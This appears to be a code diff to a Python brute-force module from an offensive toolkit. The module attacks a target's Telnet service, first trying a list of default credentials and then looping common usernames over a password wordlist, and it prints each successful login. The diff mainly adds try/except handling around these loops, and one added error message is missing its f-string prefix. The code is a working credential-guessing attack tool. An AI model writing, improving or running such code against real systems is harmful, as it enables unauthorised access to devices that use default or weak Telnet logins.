@@ -56,40 +56,45 @@ def execute(options):
     print(f"{C.MENU}  [*] Starting stage 1: Kredensial Default...")
     found_weak_creds = False
 
-    for user, passwd in DEFAULT_CREDS:
-        if test_telnet(target_ip, port, user, passwd):
-            print(f"{C.SUCCESS}  {SYM_SUCCESS} LOGIN SUCCESS! (Telnet) -> U:{user} P:{passwd}")
-            found_weak_creds = True
-            break
-        print(f"{C.MENU}  {SYM_FAILED} FAIL: {user}:{passwd}")
+    try:
+        for user, passwd in DEFAULT_CREDS:
+            if test_telnet(target_ip, port, user, passwd):
+                print(f"{C.SUCCESS}  {SYM_SUCCESS} LOGIN SUCCESS! (Telnet) -> U:{user} P:{passwd}")
+                found_weak_creds = True
+                break
+            print(f"{C.MENU}  {SYM_FAILED} FAIL: {user}:{passwd}")
 
-    if found_weak_creds:
-        return
+        if found_weak_creds:
+            return
 
     # ---------------------------------------------
     # Stage 2: Brute Force Wordlist
     # ---------------------------------------------
-    if wordlist_path and os.path.exists(wordlist_path):
-        print(f"\n{C.MENU}  [*] Starting stage 2: Brute Force {wordlist_path}...")
+        if wordlist_path and os.path.exists(wordlist_path):
+            print(f"\n{C.MENU}  [*] Starting stage 2: Brute Force {wordlist_path}...")
 
-        try:
-            with open(wordlist_path, 'r', encoding='latin-1') as f:
-                for target_user in COMMON_USERS:
-                    f.seek(0)
-                    for line in f:
-                        passwd = line.strip()
-                        if not passwd:
-                            continue
+            try:
+                with open(wordlist_path, 'r', encoding='latin-1') as f:
+                    for target_user in COMMON_USERS:
+                        f.seek(0)
+                        for line in f:
+                            passwd = line.strip()
+                            if not passwd:
+                                continue
+                            if test_telnet(target_ip, port, target_user, passwd):
+                                print(f"{C.SUCCESS} \n  {SYM_SUCCESS} LOGIN SUCCESS! (Telnet) -> U:{target_user} P:{passwd}")
+                                return
+                            print(f"{C.MENU}  [>] TRY: U:{target_user:<20} P:{passwd:<20}", end='\r', flush=True)
 
-                        if test_telnet(target_ip, port, target_user, passwd):
-                            print(f"{C.SUCCESS} \n  {SYM_SUCCESS} LOGIN SUCCESS! (Telnet) -> U:{target_user} P:{passwd}")
-                            return
+                    print(f"{C.MENU} \n[!] Brute Force finish.")
 
-                        print(f"{C.MENU}  [>] TRY: U:{target_user:<20} P:{passwd:<20}", end='\r', flush=True)
+            except Exception as e:
+                print(f"{C.ERROR}\n[!] ERROR: {e}")
+        else:
+            print(f"\n{C.MENU}  {SYM_FAILED} All passwords are incorrect.")
 
-                print(f"{C.MENU} \n[!] Brute Force finish.")
+    except KeyboardInterrupt:
+        return
+    except Exception as e:
+        print("{C.ERROR}[x] GLOBAL ERROR: {e}")
 
-        except Exception as e:
-            print(f"{C.ERROR} \n [!] Error: {e}")
-    else:
-        print(f"\n{C.MENU}  {SYM_FAILED} All passwords are incorrect.")
